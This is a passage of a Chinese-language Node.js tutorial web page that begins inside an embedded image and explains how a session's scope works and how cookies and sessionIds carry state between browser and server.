a2REiq3f38otNU5zJykPPHr3Ip6vW8ov91Sry9D++149+Dj0bM0aSrN7dy4s9cOboxTxdNNO8/owzQmbL85UY/aI4tRg5NTgebp0M+Bf+CiFEEMG6S0Iqupb5ODOROIaRnTgEjauw+mnJwC24s4klc+sjLMNT4GkO0aeMcCEZ80bkrcmIN1zCmukmzBQmuTUBgfcb+DR28FwoycHRJAPgdMXsSKGPaIRyozGOxBmIaWjqEPMZZHL16Cle7OzjxUN97AGnS+SZKZ565aHMGbfHL/KjJ6Z44WRuXcanb5j8KD36w2cq8S3P97ktI2XMq/HeB2z9GZx+XuX0k+kXP+fFJ05lFaFmu85L+y6y6tBa9hzqY3WAeTXymp34rMCFNo9w2NI8c7AIIUTpGrq6QzmN50tN3dVk3JPcicWQyZ+qK/h1Ti9WV06SKYQQUCeTcUmCUQ9sjP2V7LIRfhT9AANhi8P7iyVyKroeBstgSBIMIUSZ6iLJqKeajHuabTBkWKDFZDnyalCH3ZaJ/QWGOavEkkkuJGOEjH7WS6uSEGIe6qK7RNQXRR9hmP3SRF9RTjeJekq6PoQQtVMXSYbUZAghhBCLT110l0iCIYQQQiw+dZFkSE2GEEIIsfjURZIhLRlCCCHE4lMXSYYQQgghFh9JMoQQQghRFfdkkqHoIzIPgxBCCFFl9ZNkzK4ameTCiF5gNVEFtTdMWB+VREMIIYSoooDzZIRQdc3nxj1B4thxctc/ayG6cxfR1mJx1aASS8bQ4oOsH8q/AJQ6nOSgln9BMSGEEELMT0lJRkviGMeLZQrplVjtOIaZqsxRlshZ2CnFc5Gh/EtZy4JcQgghRFVVuLskhKopzvLuC5RgANh2CgihFOwNcZYXJ6yjy3pcQgghRMVVNMloiUZRsEnUpl9k/kyTOKCpkmUIIYQQlVbBJKMFJdQKts3CtWGUyiTuZBlImiGEEEJU1tdKCW6N7kKPpv+Vv5izJbqTXXNVnwtan1GMacZBc7pWTCnMEEIIISomYJKRwjQMTxGlO3pkl05L3MDJH1poaQVaNdTEMQzDzT5CKrqmoVPDRMM0iRNjYK+KUWCEyZwwSgik+lMIIYSonDK7SyZJmAkmAEUJZf7KjmeOQEmZxG1AUciKrCKTwUiEvtTeAPNmCCGEEKIaSuouyTA5wSTQ2tJKCykmmWRyIk9ovl9Ui6IzOqqD0c/6SJDmCQt7cfbmCCGEEEtW+YWfLa20ABMpG6fdYhI7NeHbYtHS0goTk9RszEkoRBgLM0CRhapqQApbukqEEEKIiiovyWiJsnNXlNaJBKana2TSTjGBgqZ60oyQiqaAnUjULskITHFqMeJmgUm7hBBCCFGOYN0l6Vk8PSYSxzCyh5ZMJjhuTKDqGnPLgkyQOGbUaErxEql7GQhD/IikGEIIIUSlBUsyUiaGEfRGnD0SZbFS0PdqYBkEPjUhhBBCBFZ+4eci5ox4KVxnoegHGAhbHO6XdUuEEEKIaqjDJENF18Ngnco/86g6zJgexjL6ZQVWIYQQokrqJ8lwh62GAaxCK6s63SSW0U+/ZBhCCCFE1QRc6l0IIYQQojT105IRwD/99KeB4v7hJz+p8pEIIYQQ9U9aMoQQQghRFRVc6l0IIYQQYo4kGUIIIYSoCkkyhBBCCFEVkmQIIYQQoiqWbW/4vwt9DEIIIYSoQ/8fFUYzoMJmIGUAAAAASUVORK5CYII=" alt="1550720468344"></p> <h3 id="session-的有效范围"><a href="#session-的有效范围" aria-hidden="true" class="header-anchor">#</a> session 的有效范围</h3> <p>在一个网站中设置了session，则整个网站都能找到这个session</p> <h2 id="cookie-和-session-的原理"><a href="#cookie-和-session-的原理" aria-hidden="true" class="header-anchor">#</a> Cookie 和 Session 的原理</h2> <h3 id="cookie原理"><a href="#cookie原理" aria-hidden="true" class="header-anchor">#</a> cookie原理</h3> <ol><li><p>浏览器第一次访问带有cookie设置的路由时，服务器会将cookie信息通过响应头返回给浏览器</p></li> <li><p>之后浏览器每次访问服务器时都会将cookie信息通过请求头发送给服务器</p></li></ol> <h3 id="session原理"><a href="#session原理" aria-hidden="true" class="header-anchor">#</a> session原理</h3> <p><img src="/assets/img/4-1553325560473-1553325562016.a63eac22.png" alt="4"></p> <ol><li><p>浏览器第一次访问带有session设置的路由时，服务器会自动产生一个sessionId（一个很长的随机字符串），该sessionId有两个作用</p> <p>① 随着cookie返回给浏览器，保存在浏览器中   （==相当于一把钥匙==）</p> <p>② 在服务器开辟一块内存并以该sessionId命名，将数据保存在该内存中 （==相当于一个箱子==）</p></li> <li><p>浏览器之后每一次访问服务器时，sessionId都会随着请求头发送给服务器，服务器就能根据sessionId</p></li></ol> <h2 id="参考资料"><a href="#参考资料" aria-hidden="true" class="header-anchor">#</a> 参考资料</h2> <ul><li>https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Cookies</li></ul></div> <div class="page-edit"><div class="edit-link"><a href="https://github.com/thisliuyang/nodejs-tutorial/edit/master/docs/11-session_persistence.md" target="_blank" rel="noopener noreferrer">在 GitHub 上编辑此页</a> <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></div> <div class="last-updated"><span class="prefix">上次更新: </span> <span class="time">3/23/2019, 11:26:52 PM</span></div></div> <div class="page-nav"><p class="inner"><span class="prev">
        ←
        <a href="/10-web_db.html" class="prev">
          第10章 使用数据库存储网站数据
        </a></span> <span class="next"><a href="/12-ajax.html">
          第12章 Ajax
        </a>
        →
      </span></p></div> </div> <!----></div></div>
    <script src="/assets/js/app.8174091a.js" defer></script><script src="/assets/js/5.5ba4cb83.js" defer></script>
  </body>
</html>
